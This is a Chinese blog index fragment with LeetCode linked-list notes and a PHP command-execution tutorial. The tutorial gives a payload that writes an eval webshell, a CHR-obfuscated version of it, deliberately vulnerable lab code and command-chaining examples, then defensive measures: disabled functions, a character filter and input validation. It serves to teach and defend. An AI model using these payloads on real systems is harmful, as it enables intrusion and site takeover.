&#123;</span><br><span class="line">	auto p = new Node&lt;int&gt;(1);</span><br><span class="line">	Insert(p, 2);</span><br><span class="line">	int sum = 0;</span><br><span class="line">	Walk(p, [&amp;sum](const Node&lt;int&gt; *p) -&gt; void &#123; sum += p-&gt;data; &#125;);</span><br><span class="line">	cout &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line">	Remove(p);</span><br><span class="line">	sum = 0;</span><br><span class="line">	Walk(p, [&amp;sum](const Node&lt;int&gt; *p) -&gt; void &#123; sum += p-&gt;data; &#125;);</span><br><span class="line">	cout &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">作者：自在飞花</span><br><span class="line">链接：https://leetcode.cn/problems/linked-list-cycle/solutions/175734/yi-wen-gao-ding-chang-jian-de-lian-biao-wen-ti-h-2/</span><br><span class="line">来源：力扣（LeetCode）</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure>



<h1 id="1-环形链表"><a href="#1-环形链表" class="headerlink" title="1.环形链表"></a>1.环形链表</h1><p>给你一个链表的头节点 <code>head</code> ，判断链表中是否有环。</p>
<p>如果链表中有某个节点，可以通过连续跟踪 <code>next</code> 指针再次到达，则链表中存在环。 为了表示给定链表中的环，评测系统内部使用整数 <code>pos</code> 来表示链表尾连接到链表中的位置（索引从 0 开始）。<strong>注意：<code>pos</code> 不作为参数进行传递</strong> 。仅仅是为了标识链表的实际情况。</p>
<p><em>如果链表中存在环</em> ，则返回 <code>true</code> 。 否则，返回 <code>false</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：head = [3,2,0,-4], pos = 1</span><br><span class="line">输出：true</span><br><span class="line">解释：链表中有一个环，其尾部连接到第二个节点。</span><br></pre></td></tr></table></figure>

<h2 id="法1（哈希表）"><a href="#法1（哈希表）" class="headerlink" title="法1（哈希表）"></a>法1（哈希表）</h2><p>哈希表加遍历：每次遍历时，通过哈希表查看该指针是否访问过</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        set&lt;ListNode*&gt; st;</span><br><span class="line">        ListNode* p1=head;</span><br><span class="line">        <span class="keyword">while</span>(p1)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(st.<span class="built_in">count</span>(p1)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                st.<span class="built_in">insert</span>(p1);</span><br><span class="line">            &#125;</span><br><span class="line">            p1=p1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>O(n)</p>
<p>O(n)</p>
</blockquote>
<h2 id="法2（快慢指针）"><a href="#法2（快慢指针）" class="headerlink" title="法2（快慢指针）"></a>法2（快慢指针）</h2><p>这个代码不对</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    bool hasCycle(ListNode *head) &#123;</span><br><span class="line">        if(head==nullptr) return false; //没有元素</span><br><span class="line">        else if(head-&gt;next==nullptr) return false; //有1个元素</span><br><span class="line">        else if(head-&gt;next-&gt;next=head) return true;//有两个元素</span><br><span class="line"></span><br><span class="line">        ListNode* p1=head,*p2=head-&gt;next-&gt;next;</span><br><span class="line">        while(p1&amp;&amp;p2)</span><br><span class="line">        &#123;</span><br><span class="line">            if(p1==p2-&gt;next) return true;</span><br><span class="line">            p1=p1-&gt;next;</span><br><span class="line">            p2=p2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[1,2]</p>
<p>-1</p>
<p>输出：true</p>
<p>预期输出：false</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">nullptr</span>||head-&gt;next==<span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        ListNode* p1=head,*p2=head-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(p1!=p2)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="keyword">if</span>(p2==<span class="literal">nullptr</span> || p2-&gt;next==<span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">           p1=p1-&gt;next;</span><br><span class="line">           p2=p2-&gt;next-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>当链表中不存在环时，快指针将先于慢指针到达链表尾部，链表中每个节点至多被访问两次。</p>
<p>当链表中存在环时，每一轮移动后，快慢指针的距离将减小一。而初始距离为环的长度，因此至多移动 N 轮。</p>
<blockquote>
<p>O(n)</p>
<p>O(1)</p>
</blockquote>
<h1 id="2-两数相加"><a href="#2-两数相加" class="headerlink" title="2.两数相加"></a>2.两数相加</h1><p>给你两个 <strong>非空</strong> 的链表，表示两个非负的整数。它们每位数字都是按照 <strong>逆序</strong> 的方式存储的，并且每个节点只能存储 <strong>一位</strong> 数字。</p>
<p>请你将两个数相加，并以相同形式返回一个表示和的链表。</p>
<p>你可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：l1 = [2,4,3], l2 = [5,6,4]</span><br><span class="line">输出：[7,0,8]</span><br><span class="line">解释：342 + 465 = 807.</span><br></pre></td></tr></table></figure>

<h2 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h2>]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>链表</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行</title>
    <url>/2023/06/11/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
    <content><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>效果类似包含攻击，主要是由于输入的参数被当成命令来执行。</p>
<h2 id="远程命令执行漏洞"><a href="#远程命令执行漏洞" class="headerlink" title="远程命令执行漏洞"></a>远程命令执行漏洞</h2><h3 id="1-利用系统函数实现"><a href="#1-利用系统函数实现" class="headerlink" title="1.利用系统函数实现"></a>1.利用系统函数实现</h3><p>在PHP下，允许远程命令执行的函数有eval（）、assert（）、preg_replace（）、call_user_func（）。如果页面中存在上述函数且其参数可被用户控制，同时没有对参数做有效的过滤，那么就可能存在远程命令执行漏洞。</p>
<h4 id="1-eval（）与assert（）函数的区别"><a href="#1-eval（）与assert（）函数的区别" class="headerlink" title="1.eval（）与assert（）函数的区别"></a>1.eval（）与assert（）函数的区别</h4><p>eval（）与assert（）函数在执行效果上基本相同，均可动态执行代码，且接收的参数为字符串。assert（）函数虽然也会执行参数内的代码，但主要用来判断一个表达式是否成立，并返回true或false。实战中，eval（）函数通常会被系统禁用，因此在一句话木马中通常利用assert（）来实现代码执行。</p>
<p>但需要注意的是：eval参数必须是合法的PHP代码，必须以分号结尾，否则会报错。</p>
<blockquote>
<p><code>eval（&quot;phpinfo();&quot;);</code> &#x2F;&#x2F;应符合PHP的代码规范，须在phpinfo（）后面添加“<strong>；</strong>”</p>
<p><code>assert(&quot; phpinfo() &quot;);</code> &#x2F;&#x2F;assert没这要求</p>
</blockquote>
<h4 id="2-preg-replace（）函数"><a href="#2-preg-replace（）函数" class="headerlink" title="2.preg_replace（）函数"></a>2.preg_replace（）函数</h4><p>使用preg_replace（）函数的好处在于，此函数在业务系统中广泛使用，因此无法直接在PHP中进行禁用，在适用范围上比eval（）、assert（）函数好很多。但随着PHP版本的提升，preg-replace（）函数可使用的范围也非常小了。</p>
<p>其用法是执行一个正则表达式的搜索和替换</p>
<p>格式为：</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span><br><span class="line"></span><br><span class="line">//搜索subject中匹配pattern的部分，以replacement进行替换。</span><br></pre></td></tr></table></figure>
</blockquote>
<p>该函数的主要问题在于，当参数$pattern处存在一个“&#x2F;e”修饰符时，$replacement的值会被<strong>当成PHP代码</strong>来执行。此时代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo preg_replace(&quot;/test/e&quot;,$_GET[&#x27;sds&#x27;],&quot;just a test!&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>输入值为phpinfo()，会被解析成代码执行。</p>
<p><strong>仅限于PHP5.4及以下版本中，5.5之后废弃了这个修饰符</strong>。要求用preg_replace_callback（）函数来代替。</p>
<h4 id="3-利用其他函数调用实现"><a href="#3-利用其他函数调用实现" class="headerlink" title="3.利用其他函数调用实现"></a>3.利用其他函数调用实现</h4><p>利用<strong>其他函数的组合</strong>来实现类似功能。PHP中有许多函数具有<strong>调用其他函数</strong>的功能，如array_map（）函数、call_user_func（）函数等，这里以array_map函数为例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$some_array</span> = <span class="keyword">array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line"><span class="variable">$new_array</span> = <span class="title function_ invoke__">array_map</span>(<span class="variable">$cmd</span>, <span class="variable">$some_array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618101221738.png"></p>
<p>同类型函数</p>
<blockquote>
<p>·ob_start（）、unserialize（）、create_function（）</p>
<p>·usort（）、uasort（）、uksort（）</p>
<p>·array_filter（）</p>
<p>·array_reduce（）</p>
<p>·array_diff_uassoc（）、array_diff_ukey（）</p>
<p>·array_udiff（）、array_udiff_assoc（）、array_udiff_uassoc（）</p>
<p>·array_intersect_assoc（）、array_intersect_uassoc（）</p>
<p>·array_uintersect（）、array_uintersect_assoc（）、array_uintersect_uassoc（）</p>
<p>·array_walk（）、array_walk_recursive（）</p>
<p>·xml_set_character_data_handler（）</p>
<p>·xml_set_default_handler（）</p>
<p>·xml_set_element_handler（）</p>
<p>·xml_set_end_namespace_decl_handler（）</p>
<p>·xml_set_external_entity_ref_handler（）</p>
<p>·xml_set_notation_decl_handler（）</p>
<p>·xml_set_processing_instruction_handler（）</p>
<p>·xml_set_start_namespace_decl_handler（）</p>
<p>·xml_set_unparsed_entity_decl_handler（）</p>
<p>·stream_filter_register（）</p>
<p>·set_error_handler（）</p>
<p>·register_shutdown_function（）</p>
<p>·register_tick_function（）</p>
</blockquote>
<h4 id="4-利用动态函数执行"><a href="#4-利用动态函数执行" class="headerlink" title="4.利用动态函数执行"></a>4.利用动态函数执行</h4><p>PHP语言的特性之一就是当前的PHP函数可直接由字符串拼接而成。因此，很多程序用了动态函数的写法，比如用可控的函数名来动态生成要执行的函数名称及内容。</p>
<p>在命令执行功能中，可利用这个特性实现命令的执行。环境测试代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">echo $a($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>当然，在实际中不会这么写，没意义</p>
<blockquote>
<p>url中输入?a&#x3D;assert&amp;b&#x3D;phpinfo()即可执行。</p>
</blockquote>
<p>注意：<strong>在php7.1版本之后 assert()默认不再可以执行代码</strong></p>
<h3 id="2-利用漏洞获取webshell"><a href="#2-利用漏洞获取webshell" class="headerlink" title="2.利用漏洞获取webshell"></a>2.利用漏洞获取webshell</h3><p>存在远程命令执行漏洞，攻击者最想获得的就是目的站点的webshell，<strong>即目标站点的控制权限。</strong></p>
<p>利用<strong>木马技术</strong>是获取webshell的有效手段。针对存在远程命令执行漏洞的环境，攻击者会尝试<strong>构建可执行的命令，并在命令执行后会导致目标站点在其本地生成一个PHP页面。</strong>生成的PHP页面中包含一句话木马。有效命令如下：</p>
<p><code>fputs(fopen(&quot;a.php&quot;,&quot;w&quot;),&#39;&lt;?php eval($_POST[&quot;cmd&quot;])?&gt;&#39;);</code></p>
<p>为了防止被进行编码和过滤嘞，利用chr对所有字符进行ASCII转换，进而执行。</p>
<p>如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(CHR(102).CHR(112).CHR(117).CHR(116).CHR(115).CHR(40).CHR(102).CHR(111).CHR(112).CHR(101).CHR(110).CHR(40).CHR(34).CHR(97).CHR(46).CHR(112).CHR(104).CHR(112).CHR(34).CHR(44).CHR(34).CHR(119).CHR(34).CHR(41).CHR(44).CHR(39).CHR(60).CHR(63).CHR(112).CHR(104).CHR(112).CHR(32).CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(34).CHR(99).CHR(109).CHR(100).CHR(34).CHR(93).CHR(41).CHR(63).CHR(62).CHR(39).CHR(41).CHR(59))</span><br></pre></td></tr></table></figure>

<p>后台代码就这个，<strong>php5.3版本</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo preg_replace(&quot;/test/e&quot;,$_GET[&#x27;cmd&#x27;],&quot;just a test!&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618104339484.png"></p>
<p>是有的哈，蚁剑等一句话木马工具连接就可以了。</p>
<h4 id="单引号与双引号"><a href="#单引号与双引号" class="headerlink" title="单引号与双引号"></a>单引号与双引号</h4><p>关于payload的构造，务必要清楚单引号与双引号的区别。如果使用单引号，则引号内部的变量不会执行，会被系统直接输出；而双引号里的字段会经过编译器解释后进行执行，上述payload在执行fputs函数时首先要把第二个参数当做字符串处理，后面参数若用双引号包含，则程序会抛出异常，同时文件只会写入&lt;？php eval（）？&gt;，写入一句话失败。</p>
<p>url编码，单引号%27，双引号%22，记录一下。</p>
<p>函数被当作字符串进行输出而不会被执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;phpinfo()&quot;; //直接输出字符串了</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>需要利用大括号等进行特殊构造，以达到函数执行的效果。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>7.3版本都是可以的。</strong></p>
<h2 id="系统命令执行漏洞"><a href="#系统命令执行漏洞" class="headerlink" title="系统命令执行漏洞"></a>系统命令执行漏洞</h2><p>利用系统自身的命令实现额外的命令执行。</p>
<p>比如有的靶场，让你输入ip，它会帮你去检测ip地址能否连通，这就用到了系统的ping功能。</p>
<p>PHP的系统命令执行函数也能实现，比如</p>
<blockquote>
<p>system（）、exec（）、shell_exec（）、passthru（）、pcntl_exec（）、popen（）、proc_open（）等，此外还有反引号命令执行，这种方式实际上是调用shell_exec（）函数来执行。</p>
</blockquote>
<p>这个pikachu、DVWA都有。</p>
<p>以pikachu为例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;ipaddress&#x27;]!=null)&#123;</span><br><span class="line">    $ip=$_POST[&#x27;ipaddress&#x27;];</span><br><span class="line">//     $check=explode(&#x27;.&#x27;, $ip);可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255</span><br><span class="line">    if(stristr(php_uname(&#x27;s&#x27;), &#x27;windows&#x27;))&#123;</span><br><span class="line">//         var_dump(php_uname(&#x27;s&#x27;));</span><br><span class="line">        $result.=shell_exec(&#x27;ping &#x27;.$ip);//直接将变量拼接进来，没做处理</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        $result.=shell_exec(&#x27;ping -c 4 &#x27;.$ip);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  &lt;div class=&quot;page-content&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;div id=&quot;comm_main&quot;&gt;</span><br><span class="line">                &lt;p class=&quot;comm_title&quot;&gt;Here, please enter the target IP address!&lt;/p&gt;</span><br><span class="line">                &lt;form method=&quot;post&quot;&gt;</span><br><span class="line">                    &lt;input class=&quot;ipadd&quot; type=&quot;text&quot; name=&quot;ipaddress&quot; /&gt;</span><br><span class="line">                    &lt;input class=&quot;sub&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;ping&quot; /&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">                    &lt;?php</span><br><span class="line">                    if($result)&#123;</span><br><span class="line">                        echo &quot;&lt;pre&gt;&#123;$result&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ?&gt;</span><br><span class="line">            &lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>输入ip，将ping命令与ip拼接，并执行。</p>
<p>输入ip没有过滤和限制，考虑如何同时执行两条系统命令。</p>
<p>在cmd中：</p>
<blockquote>
<p>C:\Users\67538&gt;whoami&amp;&amp;ipconfig<br>laptop-0kttc8k5\67538</p>
<p>Windows IP 配置</p>
<p>以太网适配器 以太网 2:</p>
<p>…</p>
</blockquote>
<p>当然了，**;和||**效果类似</p>
<h2 id="有效防护"><a href="#有效防护" class="headerlink" title="有效防护"></a>有效防护</h2><p>主要思路是消除漏洞存在环境，或针对传入的参数进行严格限制或过滤</p>
<h3 id="1-禁用部分系统函数"><a href="#1-禁用部分系统函数" class="headerlink" title="1.禁用部分系统函数"></a>1.禁用部分系统函数</h3><p>在PHP下禁用高危系统函数的方法为：打开PHP安装目录，找到php.ini，查找到disable_functions，添加需禁用的函数名，如下所示：</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpinfo()、eval()、passthru()、exec()、system()、chroot()、scandir()、chgrp()、chown()、shell_exec()、proc_open()、proc_get_status()、ini_alter()、ini_alter()、ini_restore()、dl()、pfsockopen()、openlog()、syslog()、readlink()、symlink()、popepassthru()、stream_socket_server()、fsocket()、fsockopen()</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="2-严格过滤关键字符"><a href="#2-严格过滤关键字符" class="headerlink" title="2　严格过滤关键字符"></a>2　严格过滤关键字符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$substitutions = array( </span><br><span class="line">        &#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;, </span><br><span class="line">        &#x27;;&#x27; =&gt; &#x27;&#x27;, </span><br><span class="line">        &#x27;||&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    ); </span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br></pre></td></tr></table></figure>

<p>过滤的关键字为“&amp;&amp;”“；”“”“||”，这些都可作为本地命令执行的关键字。远程的话，涉及的关键字符则比较复杂。在远程命令执行环境利用关键字符过滤并不十分合适。</p>
<h3 id="3-严格限制允许的参数类型"><a href="#3-严格限制允许的参数类型" class="headerlink" title="3　严格限制允许的参数类型"></a>3　严格限制允许的参数类型</h3><p>令执行功能主要用于扩展用户的交互行为，允许用户输入特定的参数来实现更丰富的应用功能。</p>
<p>例如，对于本地命令执行环境，业务系统希望用户输入IP地址来实现ping功能。因此，如果能对用户输入参数进行有效的合法性判断，可避免在原有命令后面拼接多余命令，也就达到了防护远程命令执行攻击的效果。</p>
<p>比如，正则。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>命令执行漏洞使用方法较为直接，也能更好地理解漏洞存在的原理。</p>
<p>需要注意的一点是，很多Web框架，如struts、thinkphp等均在框架内实现类似命令执行的功能，但由于实现方式与此完全不同，其修复建议也只能参考对应的官方修复包。</p>
]]></content>
      <categories>
        <category>WEB安全基础</category>
        <category>命令执行</category>
      </categories>
      <tags>
        <tag>WEB安全基础</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
</search>
